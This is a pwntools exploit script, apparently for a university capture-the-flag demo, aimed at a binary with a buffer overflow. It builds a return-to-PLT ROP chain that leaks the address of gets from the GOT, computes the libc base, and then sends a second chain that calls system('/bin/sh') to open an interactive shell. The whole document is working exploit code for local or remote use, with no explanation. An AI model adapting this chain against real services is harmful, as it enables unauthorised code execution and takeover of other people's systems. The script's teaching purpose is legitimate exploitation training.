from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
r = ROP(e)

gs = '''
break *0x400723
continue
'''

if args.REMOTE:
    libc = ELF('./libc6_2.36-0ubuntu4_amd64.so', checksec=False)
else:
    libc = e.libc


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-ret2puts-demo.chals.io", 443, ssl=True, sni="cse4850-ret2puts-demo.chals.io")
    else:
        return process(e.path)


p = start()

log.info('POP RDI is at 0x%x' % r.find_gadget(['pop rdi', 'ret'])[0])
log.info('GOT[gets] is at 0x%x' % e.got['gets'])
log.info('PLT[puts] is at 0x%x' % e.plt['puts'])
log.info('main is at 0x%s' % e.sym['main'])

chain = cyclic(16)
chain += p64(r.find_gadget(['pop rdi', 'ret'])[0])
chain += p64(e.got['gets'])
chain += p64(e.plt['puts'])
chain += p64(e.sym['main'])

log.info('Sending Ret2PLT Chain and Waiting for GOT[gets] Leak')
p.sendlineafter(b'Never gonna get a shell >>> \n', chain)
pause()

leak = u64(p.recv(6).ljust(8, b'\x00'))
log.info('GOT[Gets] is at 0x%x' % leak)

log.info('Calculating Libc Base: GOT[gets](0x%x) - Libc.sym[Gets] (0x%x) = Libc Base (0x%x)' % (
    leak, libc.sym['gets'], (leak-libc.sym['gets'])))
libc.address = leak-libc.sym['gets']
log.info('Libc base is at 0x%x' % libc.address)
log.info('System is at 0x%x' % libc.sym['system'])
log.info('/bin/sh is at 0x%x' % next(libc.search(b'/bin/sh')))

pause()
chain = cyclic(16)
chain += p64(r.find_gadget(['ret'])[0])
chain += p64(r.find_gadget(['pop rdi', 'ret'])[0])
chain += p64(next(libc.search(b'/bin/sh')))
chain += p64(libc.sym['system'])

log.info('Sending Chain Borrowing /bin/sh (0x%x) and system (0x%x) from Libc' %
         (next(libc.search(b'/bin/sh')), libc.sym['system']))
p.sendlineafter(b'Never gonna get a shell >>> \n', chain)

p.interactive()
